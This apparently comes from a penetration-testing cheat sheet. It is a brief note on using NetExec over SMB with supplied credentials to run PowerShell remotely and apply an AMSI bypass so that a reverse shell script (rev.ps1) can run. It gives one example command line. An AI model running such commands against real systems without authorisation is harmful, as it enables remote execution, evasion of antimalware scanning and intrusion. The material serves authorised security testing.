# Amsi Bypass

Netexec can also do AMSI Bypass for our reverse shell payloads or execute other programs

    nxc smb IP -u USER -p 'password1' -X '$PSVersionTable' --amsi-bypass rev.ps1
    
